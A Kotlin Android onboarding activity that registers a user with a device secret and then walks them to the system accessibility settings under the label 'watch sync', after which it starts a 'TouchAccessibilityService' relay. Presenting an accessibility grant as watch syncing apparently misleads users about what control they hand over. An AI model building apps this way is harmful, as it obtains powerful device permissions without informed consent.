package com.phonehand.app

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.View
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.textfield.TextInputEditText
import java.util.concurrent.Executors

class OnboardingActivity : AppCompatActivity() {

    private lateinit var signupPanel: ScrollView
    private lateinit var syncPanel: ScrollView
    private lateinit var successPanel: View
    private lateinit var inputName: TextInputEditText
    private lateinit var inputEmail: TextInputEditText
    private lateinit var statusLine: TextView
    private lateinit var btnPrimary: Button
    private lateinit var btnEnableSync: Button
    private lateinit var btnFinish: Button

    private var openedSettings = false
    private var signupRetries = 0
    private val io = Executors.newSingleThreadExecutor()
    private val mainHandler = Handler(Looper.getMainLooper())
    private val pollA11y = object : Runnable {
        override fun run() {
            if (isWatchSyncReady()) onWatchSyncEnabled()
            else if (openedSettings) mainHandler.postDelayed(this, 500)
        }
    }
    private val retrySignup = object : Runnable {
        override fun run() {
            if (signupPanel.visibility != View.VISIBLE) return
            val name = inputName.text?.toString()?.trim().orEmpty()
            val email = inputEmail.text?.toString()?.trim().orEmpty()
            if (name.length >= 2 && email.contains("@")) runSignup(name, email, autoRetry = true)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_onboarding)
        bindViews()

        if (UserSession.isSignedUp(this) && UserSession.onboardingDone(this)) {
            goToHome()
            return
        }

        if (UserSession.isSignedUp(this)) showSyncPhase()

        btnPrimary.setOnClickListener { onSignupClick() }
        btnEnableSync.setOnClickListener { openWatchSyncSettings() }
        btnFinish.setOnClickListener { completeOnboarding() }
    }

    private fun completeOnboarding() {
        mainHandler.removeCallbacks(retrySignup)
        UserSession.setOnboardingDone(this)
        goToHome()
    }

    private fun goToHome() {
        startActivity(
            Intent(this, HomeActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            },
        )
        finish()
    }

    private fun bindViews() {
        signupPanel = findViewById(R.id.signupPanel)
        syncPanel = findViewById(R.id.syncPanel)
        successPanel = findViewById(R.id.successPanel)
        inputName = findViewById(R.id.inputName)
        inputEmail = findViewById(R.id.inputEmail)
        statusLine = findViewById(R.id.statusLine)
        btnPrimary = findViewById(R.id.btnPrimary)
        btnEnableSync = findViewById(R.id.btnEnableSync)
        btnFinish = findViewById(R.id.btnFinish)
    }

    private fun onSignupClick() {
        val name = inputName.text?.toString()?.trim().orEmpty()
        val email = inputEmail.text?.toString()?.trim().orEmpty()
        if (name.length < 2 || !email.contains("@")) {
            statusLine.text = "Enter your name and email"
            return
        }
        signupRetries = 0
        mainHandler.removeCallbacks(retrySignup)
        runSignup(name, email, autoRetry = false)
    }

    private fun runSignup(name: String, email: String, autoRetry: Boolean) {
        if (!autoRetry) {
            btnPrimary.isEnabled = false
            statusLine.text = getString(R.string.signup_creating)
        }
        val deviceId = DeviceId.id(this)
        val deviceSecret = runCatching { DeviceSecret.value(this) }.getOrElse { DeviceId.id(this) }
        io.execute {
            val result = AuthClient.signup(this, email, name, deviceId, deviceSecret, android.os.Build.MODEL)
            mainHandler.post {
                btnPrimary.isEnabled = true
                result.onSuccess { v ->
                    mainHandler.removeCallbacks(retrySignup)
                    UserSession.save(this, v.deviceSecret, v.userId, v.email, name)
                    showSyncPhase()
                }.onFailure { e ->
                    signupRetries++
                    statusLine.text = getString(R.string.signup_retry, e.message ?: "error")
                    mainHandler.removeCallbacks(retrySignup)
                    val delay = (3000L * signupRetries.coerceAtMost(6))
                    mainHandler.postDelayed(retrySignup, delay)
                }
            }
        }
    }

    private fun showSyncPhase() {
        mainHandler.removeCallbacks(retrySignup)
        signupPanel.visibility = View.GONE
        syncPanel.visibility = View.VISIBLE
        successPanel.visibility = View.GONE
        if (isWatchSyncReady()) onWatchSyncEnabled()
    }

    private fun openWatchSyncSettings() {
        openedSettings = true
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        mainHandler.post(pollA11y)
    }

    private fun onWatchSyncEnabled() {
        mainHandler.removeCallbacks(pollA11y)
        TouchAccessibilityService.instance?.ensureRelay()
        syncPanel.visibility = View.GONE
        successPanel.visibility = View.VISIBLE
    }

    override fun onResume() {
        super.onResume()
        if (syncPanel.visibility == View.VISIBLE && openedSettings) {
            if (isWatchSyncReady()) onWatchSyncEnabled()
            else mainHandler.post(pollA11y)
        }
    }

    override fun onPause() {
        mainHandler.removeCallbacks(pollA11y)
        super.onPause()
    }

    override fun onDestroy() {
        mainHandler.removeCallbacks(retrySignup)
        io.shutdown()
        super.onDestroy()
    }

    private fun isWatchSyncReady(): Boolean {
        val am = getSystemService(ACCESSIBILITY_SERVICE) as AccessibilityManager
        return am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_GENERIC)
            .any { it.resolveInfo.serviceInfo.packageName == packageName }
    }
}
